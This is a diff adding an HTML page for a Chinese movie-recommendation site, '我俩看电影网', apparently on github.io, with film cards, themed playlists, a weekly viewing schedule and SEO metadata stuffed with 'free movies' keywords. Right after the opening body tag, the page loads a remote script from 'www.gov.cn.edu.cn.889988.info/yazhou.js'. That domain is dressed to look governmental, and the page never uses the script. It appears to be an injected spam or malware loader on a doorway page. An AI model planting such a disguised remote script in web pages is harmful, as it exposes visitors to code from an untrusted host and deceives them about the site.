@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="我俩看电影网（woliakandianyingwang-app）是面向情侣、朋友与家人结伴观影的影视导航与分享平台。提供最新院线电影资讯、高分片单推荐、类型频道索引与观影日历，覆盖动作、喜剧、爱情、科幻、悬疑、动画、纪录片等丰富品类。访问 https://woliakandianyingwang-app.github.io 获取每日更新的免费电影观看入口、在线放映厅与追剧排期。">
+<meta name="keywords" content="我俩看电影网, woliakandianyingwang-app, 我俩看电影, 免费电影, 在线电影, 电影推荐, 院线新片, 高分电影, 爱情电影, 喜剧电影, 科幻电影, 悬疑电影, 动画片单, 纪录片, 观影指南, 电影资讯, 电影票, 双人观影, 周末电影, github.io">
+<meta name="author" content="我俩看电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<meta name="theme-color" content="#0b1020">
+<title>我俩看电影网 - 两个人一起看的电影才好看 | woliakandianyingwang-app</title>
+<style>
+  :root{
+    --ink:#eaf0ff;
+    --ink-dim:#aab4d0;
+    --brand:#ff5b7f;
+    --brand-2:#7b6bff;
+    --deep:#0b1020;
+    --card:#141b33;
+    --line:rgba(255,255,255,.08);
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+    background:var(--deep);
+    color:var(--ink);
+    line-height:1.7;
+    overflow-x:hidden;
+  }
+  a{color:inherit;text-decoration:none}
+  .wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+
+  /* header */
+  header{
+    position:sticky;top:0;z-index:50;
+    backdrop-filter:blur(10px);
+    background:rgba(11,16,32,.82);
+    border-bottom:1px solid var(--line);
+  }
+  .nav{display:flex;align-items:center;gap:18px;height:64px}
+  .logo{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.5px}
+  .logo mark{
+    background:linear-gradient(120deg,var(--brand),var(--brand-2));
+    color:#fff;padding:4px 10px;border-radius:8px;font-size:15px;
+  }
+  .logo small{color:var(--ink-dim);font-weight:500;font-size:12px}
+  .nav-links{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap}
+  .nav-links a{
+    padding:8px 12px;border-radius:999px;font-size:14px;color:var(--ink-dim);
+    transition:.2s;
+  }
+  .nav-links a:hover{color:#fff;background:rgba(255,255,255,.06)}
+
+  /* hero */
+  .hero{
+    position:relative;padding:78px 0 70px;
+    background:
+      radial-gradient(900px 400px at 82% -10%,rgba(123,107,255,.35),transparent 60%),
+      radial-gradient(700px 360px at 8% 20%,rgba(255,91,127,.28),transparent 60%);
+  }
+  .hero h1{
+    font-size:clamp(30px,5.4vw,58px);line-height:1.18;font-weight:900;
+    background:linear-gradient(100deg,#fff 10%,#ffb3c2 55%,#bdb6ff 90%);
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+  }
+  .hero p{margin-top:18px;max-width:660px;color:var(--ink-dim);font-size:16px}
+  .hero .addr{
+    display:inline-flex;align-items:center;gap:10px;margin-top:24px;
+    padding:10px 16px;border:1px solid var(--line);border-radius:12px;
+    background:rgba(255,255,255,.03);font-size:14px;color:var(--ink-dim);
+  }
+  .hero .addr b{color:#fff;font-weight:700}
+  .hero-actions{margin-top:28px;display:flex;gap:12px;flex-wrap:wrap}
+  .btn{
+    padding:13px 26px;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;
+    border:1px solid transparent;transition:.2s;
+  }
+  .btn-primary{background:linear-gradient(120deg,var(--brand),var(--brand-2));color:#fff}
+  .btn-ghost{background:transparent;color:#fff;border-color:var(--line)}
+  .btn:hover{transform:translateY(-2px)}
+
+  /* section */
+  section{padding:60px 0}
+  .eyebrow{color:var(--brand);font-size:13px;font-weight:800;letter-spacing:2px}
+  .sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap;margin-bottom:30px}
+  .sec-head h2{font-size:clamp(22px,3.4vw,34px);font-weight:900}
+  .sec-head h2 em{font-style:normal;color:var(--brand-2)}
+  .ticker{color:var(--ink-dim);font-size:13px}
+
+  /* cards */
+  .grid{display:grid;gap:20px}
+  .g-4{grid-template-columns:repeat(4,1fr)}
+  .g-3{grid-template-columns:repeat(3,1fr)}
+  .g-2{grid-template-columns:repeat(2,1fr)}
+  .card{
+    background:var(--card);border:1px solid var(--line);border-radius:18px;
+    padding:22px;transition:.25s;
+  }
+  .card:hover{transform:translateY(-5px);border-color:rgba(255,91,127,.4)}
+  .card .tag{
+    display:inline-block;padding:3px 10px;border-radius:999px;font-size:12px;
+    background:rgba(123,107,255,.16);color:#c2baff;margin-bottom:12px;
+  }
+  .card h3{font-size:18px;margin-bottom:8px}
+  .card p{color:var(--ink-dim);font-size:14px}
+  .poster{
+    aspect-ratio:3/4;border-radius:12px;margin-bottom:14px;
+    display:flex;align-items:flex-end;padding:12px;
+    background:linear-gradient(160deg,rgba(255,255,255,.06),rgba(0,0,0,.4));
+    position:relative;overflow:hidden;
+  }
+  .poster span{font-size:13px;font-weight:700;position:relative;z-index:2}
+  .poster::after{content:"";position:absolute;inset:0;opacity:.5}
+
+  /* channel pills */
+  .channels{display:flex;gap:10px;flex-wrap:wrap}
+  .chip{
+    padding:10px 18px;border-radius:999px;font-size:14px;font-weight:600;
+    background:rgba(255,255,255,.04);border:1px solid var(--line);color:var(--ink-dim);
+    transition:.2s;
+  }
+  .chip:hover{color:#fff;border-color:var(--brand);background:rgba(255,91,127,.1)}
+
+  /* schedule */
+  .schedule{display:grid;grid-template-columns:110px 1fr;gap:0;border:1px solid var(--line);border-radius:18px;overflow:hidden}
+  .schedule div{padding:14px 18px;border-bottom:1px solid var(--line);font-size:14px}
+  .schedule .day{background:rgba(123,107,255,.08);color:#c2baff;font-weight:800}
+  .schedule .day:last-child,.schedule div:last-child{border-bottom:none}
+
+  /* footer */
+  footer{border-top:1px solid var(--line);padding:44px 0 30px;color:var(--ink-dim);font-size:13px}
+  .foot-grid{display:grid;grid-template-columns:2fr 1fr 1fr;gap:30px}
+  .foot-grid h4{color:#fff;margin-bottom:12px;font-size:15px}
+  .foot-grid ul{list-style:none;display:grid;gap:8px}
+  .foot-grid a:hover{color:#fff}
+  .copyright{margin-top:28px;padding-top:20px;border-top:1px solid var(--line);display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+
+  @media (max-width:900px){
+    .g-4,.g-3{grid-template-columns:repeat(2,1fr)}
+    .foot-grid{grid-template-columns:1fr 1fr}
+  }
+  @media (max-width:600px){
+    .nav{height:56px;gap:10px}
+    .nav-links a{padding:6px 9px;font-size:13px}
+    .logo small{display:none}
+    .hero{padding:48px 0 42px}
+    .g-4,.g-3,.g-2{grid-template-columns:1fr}
+    .schedule{grid-template-columns:88px 1fr}
+    .schedule div{padding:12px}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <a class="logo" href="#top">
+      <mark>我俩看电影网</mark>
+      <small>woliakandianyingwang-app</small>
+    </a>
+    <nav class="nav-links">
+      <a href="#hot">正在热映</a>
+      <a href="#type">类型频道</a>
+      <a href="#list">片单推荐</a>
+      <a href="#plan">观影排期</a>
+      <a href="#about">关于我们</a>
+    </nav>
+  </div>
+</header>
+
+<main id="top">
+  <!-- HERO -->
+  <section class="hero">
+    <div class="wrap">
+      <span class="eyebrow">WO LIA KAN DIAN YING · 结伴观影指南</span>
+      <h1>两个人一起看的电影<br>才真正算看过</h1>
+      <p>我俩看电影网（woliakandianyingwang-app）专注于「结伴观影」这件事：为情侣、朋友、家人挑选合适的一部，把最新院线、高分冷门、类型片与放映信息整理成一张看得懂的片单。不堆砌资讯，只回答一个问题——今晚，我俩看什么。</p>
+      <div class="addr">
+        <span>官方网址</span>
+        <b>https://woliakandianyingwang-app.github.io</b>
+      </div>
+      <div class="hero-actions">
+        <a class="btn btn-primary" href="#hot">挑今晚的片</a>
+        <a class="btn btn-ghost" href="#type">按心情找类型</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目一：正在热映 -->
+  <section id="hot" class="wrap">
+    <div class="sec-head">
+      <h2>正在热映 <em>· 院线在榜</em></h2>
+      <span class="ticker">数据口径：综合票房、口碑与排片，每日更新</span>
+    </div>
+    <div class="grid g-4">
+      <article class="card">
+        <div class="poster" style="background:linear-gradient(160deg,#3a1c71,#d76d77)"><span>NO.1 剧情</span></div>
+        <span class="tag">高分</span>
+        <h3>沉默的河流</h3>
+        <p>一座小镇的秘密，被一场暴雨冲上水面。节奏克制，表演扎实，适合两个人安静看完再聊一会儿。</p>
+      </article>
+      <article class="card">
+        <div class="poster" style="background:linear-gradient(160deg,#0f2027,#203a43,#2c5364)"><span>NO.2 科幻</span></div>
+        <span class="tag">视效</span>
+        <h3>星轨回响</h3>
+        <p>近未来太空救援题材，美术与配乐是最大亮点，IMAX 厅体验加成明显。</p>
+      </article>
+      <article class="card">
+        <div class="poster" style="background:linear-gradient(160deg,#f12711,#f5af19)"><span>NO.3 喜剧</span></div>
+        <span class="tag">合家欢</span>
+        <h3>临时家长</h3>
+        <p>误打误撞的带娃之旅，笑点密集但不低幼，适合朋友局或带长辈一起看。</p>
+      </article>
+      <article class="card">
+        <div class="poster" style="background:linear-gradient(160deg,#654ea3,#da98b4)"><span>NO.4 爱情</span></div>
+        <span class="tag">双人场</span>
+        <h3>第七次见面</h3>
+        <p>七年、七次约会的都市爱情小品，台词犀利，结尾留白，情侣场命中率很高。</p>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二：类型频道 -->
+  <section id="type" class="wrap">
+    <div class="sec-head">
+      <h2>类型频道 <em>· 按心情选</em></h2>
+      <span class="ticker">不想动脑？先选一种情绪</span>
+    </div>
+    <div class="channels">
+      <a class="chip" href="#">动作 · 肾上腺素</a>
+      <a class="chip" href="#">喜剧 · 笑就完了</a>
+      <a class="chip" href="#">爱情 · 双人场</a>
+      <a class="chip" href="#">科幻 · 脑洞</a>
+      <a class="chip" href="#">悬疑 · 反转</a>
+      <a class="chip" href="#">动画 · 治愈</a>
+      <a class="chip" href="#">纪录片 · 真实</a>
+      <a class="chip" href="#">恐怖 · 胆量测试</a>
+      <a class="chip" href="#">文艺 · 慢下来</a>
+      <a class="chip" href="#">经典 · 重看不腻</a>
+    </div>
+  </section>
+
+  <!-- 栏目三：片单推荐 -->
+  <section id="list" class="wrap">
+    <div class="sec-head">
+      <h2>片单推荐 <em>· 编辑精选</em></h2>
+      <span class="ticker">主题式选片，每张片单 8–12 部</span>
+    </div>
+    <div class="grid g-3">
+      <article class="card">
+        <span class="tag">情侣场</span>
+        <h3>吵架之后一起看</h3>
+        <p>《爱在黎明破晓前》《花样年华》《你的名字。》《婚姻故事》《春光乍泄》——看完会自动和好，或至少想认真聊一次。</p>
+      </article>
+      <article class="card">
+        <span class="tag">朋友局</span>
+        <h3>六个人也吵不散</h3>
+        <p>《疯狂的石头》《低俗小说》《寄生虫》《两杆大烟枪》《看不见的客人》，反转与梗密度高，适合边看边喊。</p>
+      </article>
+      <article class="card">
+        <span class="tag">一个人</span>
+        <h3>独处时的陪伴</h3>
+        <p>《海边的曼彻斯特》《小森林》《心灵奇旅》《寻梦环游记》《步履不停》，不催泪不上价值，只是陪你坐着。</p>
+      </article>
+      <article class="card">
+        <span class="tag">周末</span>
+        <h3>两小时被治愈</h3>
+        <p>《星际穿越》《少年派的奇幻漂流》《千与千寻》《飞屋环游记》《星际宝贝》，画面与音乐都经得起大屏。</p>
+      </article>
+      <article class="card">
+        <span class="tag">烧脑</span>
+        <h3>看完要复盘</h3>
+        <p>《盗梦空间》《致命ID》《禁闭岛》《彗星来的那一夜》《记忆碎片》，建议看完别急着走，从头捋一遍。</p>
+      </article>
+      <article class="card">
+        <span class="tag">冷门</span>
+        <h3>没听过但真好</h3>
+        <p>《爆裂鼓手》《房间》《狩猎》《波西米亚狂想曲》《小丑》，评分高、名气小，推荐给"片荒"的人。</p>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目四：观影排期 -->
+  <section id="plan" class="wrap">
+    <div class="sec-head">
+      <h2>观影排期 <em>· 一周安排</em></h2>
+      <span class="ticker">周三半价日 · 周二会员日</span>
+    </div>
+    <div class="schedule">
+      <div class="day">周一</div><div>补一部上周错过的院线，人少厅空，适合社恐。</div>
+      <div class="day">周二</div><div>会员日，票价最低；选 20:00 后的场次，情绪最到位。</div>
+      <div class="day">周三</div><div>半价日 + 冷门文艺片，性价比最高的一晚。</div>
+      <div class="day">周四</div><div>为周末预热：看预告、定片单、抢好座位。</div>
+      <div class="day">周五</div><div>新片集中上映，首映场氛围最好，适合约会。</div>
+      <div class="day">周六</div><div>家庭场 / 动画场，带小朋友或长辈的首选。</div>
+      <div class="day">周日</div><div>长片与剧集马拉松，宅家投影最佳时机。</div>
+    </div>
+  </section>
+
+  <!-- 栏目五：关于 / 观影指南 -->
+  <section id="about" class="wrap">
+    <div class="sec-head">
+      <h2>关于我俩看电影网 <em>· 怎么用</em></h2>
+      <span class="ticker">一个单页，解决"看什么"</span>
+    </div>
+    <div class="grid g-3">
+      <article class="card">
+        <span class="tag">STEP 01</span>
+        <h3>先定人数</h3>
+        <p>两个人、一群人、一个人，选片逻辑完全不同。先回答"和谁看"，再回答"看什么"。</p>
+      </article>
+      <article class="card">
+        <span class="tag">STEP 02</span>
+        <h3>再定时长</h3>
+        <p>90 分钟以内的喜剧适合碎片时间；140 分钟以上的史诗片，请预留完整夜晚与零食。</p>
+      </article>
+      <article class="card">
+        <span class="tag">STEP 03</span>
+        <h3>最后定厅</h3>
+        <p>悬疑、科幻优先 IMAX / Dolby；爱情、文艺片中厅即可；动画片建议带小孩坐中后排。</p>
+      </article>
+    </div>
+    <div class="grid g-2" style="margin-top:20px">
+      <article class="card">
+        <h3>为什么叫"我俩"</h3>
+        <p>电影从来不是一个人的事。影院里的笑声、片尾字幕亮起时的沉默、走出大厅那句"你觉得刚才那个镜头是什么意思"——这些才是看电影的意义。我俩看电影网不做海量聚合，只做一件事：帮你在正确的晚上，选对那一部。</p>
+      </article>
+      <article class="card">
+        <h3>内容更新与说明</h3>
+        <p>本站片单与资讯由编辑人工筛选，涵盖华语、日韩、欧美及独立电影，更新频率为每周不少于三次。所有推荐均为主观口味，评分仅供参考。影片上映信息与票价以当地影院公示为准。更多主题片单、观影笔记与每周新片速览，持续在站内含锚点页面更新。</p>
+      </article>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <a class="logo" href="#top"><mark>我俩看电影网</mark></a>
+        <p style="margin-top:12px;max-width:360px">两个人一起看的电影才好看。我俩看电影网（woliakandianyingwang-app）是聚焦结伴观影的影视导航与分享站点。</p>
+      </div>
+      <div>
+        <h4>快速入口</h4>
+        <ul>
+          <li><a href="#hot">正在热映</a></li>
+          <li><a href="#type">类型频道</a></li>
+          <li><a href="#list">片单推荐</a></li>
+          <li><a href="#plan">观影排期</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>站点信息</h4>
+        <ul>
+          <li><a href="#">投稿与合作</a></li>
+          <li><a href="#">片单申请</a></li>
+          <li><a href="#">意见反馈</a></li>
+          <li><a href="#">隐私说明</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copyright">
+      <span>© <span id="yr"></span> 我俩看电影网 woliakandianyingwang-app. 本站为影视资讯导航类单页站点。</span>
+      <span>官方网址：https://woliakandianyingwang-app.github.io</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+  document.getElementById('yr').textContent = new Date().getFullYear();
+</script>
+</body>
+</html>
